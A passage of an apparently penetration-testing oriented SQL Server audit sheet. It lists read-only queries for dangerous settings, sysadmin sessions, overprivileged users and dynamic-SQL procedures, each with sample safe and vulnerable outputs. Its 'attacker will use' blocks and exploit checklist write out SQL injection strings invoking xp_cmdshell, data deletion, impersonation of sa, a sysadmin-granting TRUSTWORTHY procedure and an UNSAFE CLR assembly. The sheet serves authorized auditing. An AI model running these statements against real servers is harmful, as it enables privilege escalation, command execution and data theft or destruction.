+VULNERABLE OUTPUT:
+name        | subject   | expiry_date         | pvt_key_encryption_type_desc
+------------|-----------|---------------------|----------------------------
+ExpiredCert | TestCert  | 2020-01-01 00:00:00 | MK
+WeakCert    | Unknown   | 2025-12-31 23:59:59 | PW
+TestCert    | Test      | 2024-06-30 23:59:59 | MK
+
+VULNERABLE DESCRIPTION:
+Expired or weakly protected certificates found. May indicate poor security 
+practices or enable certificate-based attacks.
+
+ATTACKER WILL USE:
+-- Export certificate (if permissions allow)
+-- Use certificate to decrypt data
+-- For expired certificates - trust chain issues
+-- For weak private key encryption - attempt to crack
+
+SEVERITY: MEDIUM
+IMPACT: Data decryption, trust compromise
+
+
+================================================================
+21. CONFIGURATION SNAPSHOT - ALL DANGEROUS SETTINGS
+================================================================
+
+COMMAND:
+SELECT name, value_in_use,
+       CASE 
+         WHEN name = 'xp_cmdshell' AND value_in_use = 1 THEN 'CRITICAL - RCE'
+         WHEN name = 'clr enabled' AND value_in_use = 1 THEN 'HIGH - Code Execution'
+         WHEN name = 'Ole Automation Procedures' AND value_in_use = 1 THEN 'HIGH - RCE'
+         WHEN name = 'Ad Hoc Distributed Queries' AND value_in_use = 1 THEN 'MEDIUM - Data Exfil'
+         WHEN name = 'remote admin connections' AND value_in_use = 1 THEN 'MEDIUM - Remote DAC'
+         WHEN name = 'cross db ownership chaining' AND value_in_use = 1 THEN 'MEDIUM - EoP'
+         WHEN name = 'contained database authentication' AND value_in_use = 1 THEN 'MEDIUM - Auth Bypass'
+         WHEN name = 'Database Mail XPs' AND value_in_use = 1 THEN 'LOW - Email'
+         ELSE 'Check'
+       END AS risk_level
+FROM sys.configurationsWHERE name IN ('xp_cmdshell', 'clr enabled', 'clr strict security',
+               'Ole Automation Procedures', 'Ad Hoc Distributed Queries',
+               'remote admin connections', 'cross db ownership chaining',
+               'contained database authentication', 'Database Mail XPs',
+               'remote access')
+ORDER BY risk_level;
+
+PURPOSE: Quick overview of all dangerous settings
+
+SAFE OUTPUT:
+name                           | value_in_use | risk_level
+-------------------------------|--------------|-----------
+Ad Hoc Distributed Queries     | 0            | Check
+clr enabled                    | 0            | Check
+clr strict security            | 1            | Check
+contained database authentication| 0          | Check
+cross db ownership chaining    | 0            | Check
+Database Mail XPs              | 0            | Check
+Ole Automation Procedures      | 0            | Check
+remote access                  | 1            | Check
+remote admin connections       | 0            | Check
+xp_cmdshell                    | 0            | Check
+
+SAFE DESCRIPTION:
+All dangerous features disabled. Good security posture.
+
+VULNERABLE OUTPUT:
+name                           | value_in_use | risk_level
+-------------------------------|--------------|-----------
+Ad Hoc Distributed Queries     | 1            | MEDIUM - Data Exfil
+clr enabled                    | 1            | HIGH - Code Execution
+clr strict security            | 0            | Check
+contained database authentication| 1          | MEDIUM - Auth Bypass
+cross db ownership chaining    | 1            | MEDIUM - EoP
+Database Mail XPs              | 1            | LOW - Email
+Ole Automation Procedures      | 1            | HIGH - RCE
+remote access                  | 1            | Check
+remote admin connections       | 1            | MEDIUM - Remote DAC
+xp_cmdshell                    | 1            | CRITICAL - RCE
+
+VULNERABLE DESCRIPTION:
+Multiple dangerous features enabled. Attack surface is large.
+
+ATTACKER WILL USE:
+-- Combine multiple vulnerabilities for complete compromise
+-- Use xp_cmdshell for initial RCE
+-- Use CLR for persistent code execution
+-- Use remote admin connections for access
+-- Use cross DB chaining for privilege escalation
+
+SEVERITY: VARIES (CRITICAL if xp_cmdshell enabled)
+IMPACT: Complete system compromise
+
+
+================================================================
+22. ACTIVE SESSIONS WITH ADMIN PRIVILEGES
+================================================================
+
+COMMAND:
+SELECT s.session_id, s.login_name, s.host_name, s.program_name,
+       s.is_user_process, c.encrypt_option
+FROM sys.dm_exec_sessions s
+JOIN sys.dm_exec_connections c ON s.session_id = c.session_id
+WHERE s.is_user_process = 1 
+  AND EXISTS (SELECT 1 FROM sys.server_role_members rm
+              JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
+              JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id
+              WHERE m.name = s.login_name AND r.name = 'sysadmin')
+ORDER BY s.session_id;
+
+PURPOSE: Find active sysadmin sessions
+
+SAFE OUTPUT:
+session_id | login_name | host_name | program_name | encrypt_option
+-----------|------------|-----------|--------------|---------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No active sysadmin sessions.
+
+VULNERABLE OUTPUT:
+session_id | login_name      | host_name | program_name | encrypt_option
+-----------|-----------------|-----------|--------------|---------------
+51         | DOMAIN\admin    | ADMIN-PC  | SSMS         | TRUE
+52         | sa              | DB-SERVER | SQL Server   | TRUE
+53         | DOMAIN\svc_sql  | APP-SERVER| SQL Agent    | FALSE
+
+VULNERABLE DESCRIPTION:
+Active sysadmin sessions exist. If attacker can hijack these sessions, 
+full admin access is possible.
+
+ATTACKER WILL USE:
+-- Check if session is vulnerable
+SELECT session_id, login_name, encrypt_option 
+FROM sys.dm_exec_connections WHERE session_id = 52;
+
+-- If unencrypted, hijack session
+-- Monitor SQL traffic to capture session token
+-- Use session token to impersonate sysadmin
+
+SEVERITY: HIGH
+IMPACT: Session hijacking, privilege escalation
+
+
+================================================================
+23. DATABASE PERMISSIONS AUDIT - OVERPRIVILEGED USERS
+================================================================
+
+COMMAND:
+SELECT g.name AS grantee_name, g.type_desc,
+       p.state_desc, p.permission_name,
+       OBJECT_SCHEMA_NAME(p.major_id) AS object_schema,
+       OBJECT_NAME(p.major_id) AS object_name
+FROM sys.database_permissions p
+JOIN sys.database_principals g ON p.grantee_principal_id = g.principal_id
+WHERE p.permission_name IN ('CONTROL', 'ALTER', 'TAKE OWNERSHIP', 'IMPERSONATE')
+  AND g.name NOT IN ('dbo', 'guest')
+ORDER BY g.name, p.permission_name;
+
+PURPOSE: Find overprivileged database users (run in each DB)
+
+SAFE OUTPUT:
+grantee_name | type_desc | permission_name | object_schema | object_name
+-------------|-----------|-----------------|---------------|------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No overprivileged database users found.
+
+VULNERABLE OUTPUT:
+grantee_name | type_desc    | permission_name | object_schema | object_name
+-------------|--------------|-----------------|---------------|------------
+app_user     | SQL_USER     | CONTROL         | dbo           | Users
+app_user     | SQL_USER     | CONTROL         | dbo           | CreditCards
+app_user     | SQL_USER     | IMPERSONATE     | dbo           | dbo
+test_user    | SQL_USER     | ALTER           | dbo           | Orders
+test_user    | SQL_USER     | TAKE OWNERSHIP  | dbo           | Sales
+
+VULNERABLE DESCRIPTION:
+Low-privileged users have powerful permissions on sensitive objects.
+
+ATTACKER WILL USE:
+-- CONTROL permission means full control over table
+-- Can read, modify, delete any data
+SELECT * FROM CreditCards; -- Read data
+DELETE FROM CreditCards; -- Delete data
+
+-- IMPERSONATE dbo means can perform any action
+EXECUTE AS USER = 'dbo';
+CREATE PROCEDURE malicious AS... -- Create admin procedure
+
+SEVERITY: HIGH
+IMPACT: Data breach, privilege escalation
+
+
+================================================================
+24. CHECK FOR SQL INJECTION VECTORS - STORED PROCEDURES
+================================================================
+
+COMMAND:
+SELECT SCHEMA_NAME(schema_id) AS schema_name, name AS procedure_name,
+       create_date, modify_date
+FROM sys.procedures
+WHERE name LIKE '%dynamic%' OR name LIKE '%exec%' 
+   OR name LIKE '%sql%' OR name LIKE '%query%'
+   OR name LIKE '%search%' OR name LIKE '%filter%'
+ORDER BY schema_name, procedure_name;
+
+PURPOSE: Find procedures that might contain dynamic SQL
+
+SAFE OUTPUT:
+schema_name | procedure_name | create_date | modify_date
+------------|----------------|-------------|------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No suspicious procedure names found.
+
+VULNERABLE OUTPUT:
+schema_name | procedure_name        | create_date         | modify_date
+------------|-----------------------|---------------------|--------------------
+dbo         | sp_DynamicSearch      | 2024-01-15 10:00:00 | 2024-01-15 10:00:00
+dbo         | sp_ExecuteSQL         | 2024-02-20 14:30:00 | 2024-02-20 14:30:00
+dbo         | sp_FilterUsers        | 2024-03-01 09:00:00 | 2024-03-01 09:00:00
+dbo         | sp_AdvancedSearch     | 2024-04-10 11:00:00 | 2024-04-10 11:00:00
+
+VULNERABLE DESCRIPTION:
+Procedures with names suggesting dynamic SQL usage. May be vulnerable to 
+SQL injection.
+
+ATTACKER WILL USE:
+-- If procedure has dynamic SQL
+EXEC sp_DynamicSearch '1; SELECT * FROM Users WHERE 1=1; --';
+
+-- Try to find injection points
+EXEC sp_FilterUsers 'test'' OR 1=1; --';
+
+-- Gain access to data
+EXEC sp_AdvancedSearch '1; EXEC xp_cmdshell ''whoami''; --';
+
+SEVERITY: HIGH
+IMPACT: SQL injection, data breach, command execution
+
+
+================================================================
+25. FINAL ATTACKER SUMMARY
+================================================================
+
+COMMAND:
+SELECT @@SERVERNAME AS server_name,
+       SERVERPROPERTY('ProductVersion') AS product_version,
+       SERVERPROPERTY('Edition') AS edition,
+       SERVERPROPERTY('IsIntegratedSecurityOnly') AS windows_auth_only,
+       IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin,
+       (SELECT COUNT(*) FROM sys.sql_logins WHERE is_disabled = 0) AS active_sql_logins,
+       (SELECT COUNT(*) FROM sys.credentials) AS stored_credentials,
+       (SELECT COUNT(*) FROM sys.databases WHERE is_trustworthy_on = 1) AS trustworthy_dbs,
+       (SELECT COUNT(*) FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE') AS impersonate_perms,
+       (SELECT CASE WHEN value_in_use = 1 THEN 'ENABLED' ELSE 'DISABLED' END 
+        FROM sys.configurations WHERE name = 'xp_cmdshell') AS xp_cmdshell_status;
+
+PURPOSE: Quick attacker summary of all vulnerabilities
+
+SAFE OUTPUT:
+server_name    | product_version | edition | windows_auth_only | is_sysadmin | active_sql_logins | stored_credentials | trustworthy_dbs | impersonate_perms | xp_cmdshell_status
+---------------|-----------------|---------|-------------------|-------------|-------------------|-------------------|-----------------|-------------------|-------------------
+SQLTEST01      | 15.0.4480.2     | Enterprise | 0                 | 0           | 2                 | 0                  | 0               | 0                 | DISABLED
+
+SAFE DESCRIPTION:
+Good security posture. No critical vulnerabilities found.
+
+VULNERABLE OUTPUT:
+server_name    | product_version | edition | windows_auth_only | is_sysadmin | active_sql_logins | stored_credentials | trustworthy_dbs | impersonate_perms | xp_cmdshell_status
+---------------|-----------------|---------|-------------------|-------------|-------------------|-------------------|-----------------|-------------------|-------------------
+SQLTEST01      | 15.0.4480.2     | Enterprise | 0                 | 1           | 5                 | 3                  | 2               | 4                 | ENABLED
+
+VULNERABLE DESCRIPTION:
+Critical vulnerabilities found:
+1. Current account has sysadmin privileges
+2. Multiple active SQL logins
+3. Stored credentials exist
+4. TRUSTWORTHY databases present
+5. Impersonation permissions granted
+6. xp_cmdshell is ENABLED
+
+ATTACKER WILL DO:
+1. Use xp_cmdshell for OS command execution
+2. Use impersonation to become sysadmin
+3. Use TRUSTWORTHY for privilege escalation
+4. Use stored credentials for lateral movement
+5. Exfiltrate data via external sources
+6. Create persistence mechanisms
+7. Cover tracks by disabling auditing
+
+OVERALL RISK: CRITICAL
+FULL SYSTEM COMPROMISE POSSIBLE
+
+
+================================================================
+ATTACKER EXPLOIT CHECKLIST
+================================================================
+
+To validate read-only findings:
+
+1. xp_cmdshell test:
+   EXEC xp_cmdshell 'whoami';
+
+2. Impersonation test:
+   EXECUTE AS LOGIN = 'sa';
+   SELECT USER_NAME();
+   REVERT;
+
+3. TRUSTWORTHY test (if db_owner):
+   CREATE PROCEDURE test WITH EXECUTE AS OWNER AS
+   BEGIN
+      EXEC sp_addsrvrolemember 'current_user', 'sysadmin';
+   END;
+
+4. Linked server test:
+   EXEC ('SELECT @@VERSION') AT PROD_SERVER;
+
+5. CLR test (if enabled):
+   CREATE ASSEMBLY test FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
+
+================================================================
+CRITICAL REMINDERS
+================================================================
+
+- These are READ-ONLY reconnaissance commands
+- DO NOT execute actual exploits without authorization
+- Validate business requirement before reporting
+- Disabled != Secure (check if actually needed)
+- Enabled != Vulnerable (check if required for legitimate purpose)
+- Document everything with evidence
+- Report findings with severity and remediation
+
+
+================================================================
+ATTACK VECTORS SUMMARY
+================================================================
+
+| Attack Vector | Command | Risk | Impact |
+|---------------|---------|------|--------|
+| RCE via xp_cmdshell | Check sys.configurations | Critical | Full OS compromise |
+| Code Execution via CLR | Check clr enabled | High | Server compromise |
+| RCE via OLE Automation | Check Ole Automation | High | Command execution |
+| Data Exfiltration | Check Ad Hoc queries | High | Data theft |
+| Credential Theft | Query sys.credentials | High | Privilege escalation |
+| Privilege Escalation | Check IMPERSONATE | Critical | DB takeover |
+| Privilege Escalation | Check TRUSTWORTHY | High | Sysadmin access |
+| Lateral Movement | Check linked servers | High | Network compromise |
+| Unauthorized Access | Check PUBLIC/GUEST | High | Data breach |
+| Brute Force | Check SA status | Critical | Account takeover |
+| Session Hijacking | Check active sessions | High | Admin access |
+| SQL Injection | Check procedures | High | Data theft/RCE |
+| Persistence | Check orphaned users | Medium | Backdoor access |
+
+================================================================
+END OF ATTACKER COMMANDS
+================================================================
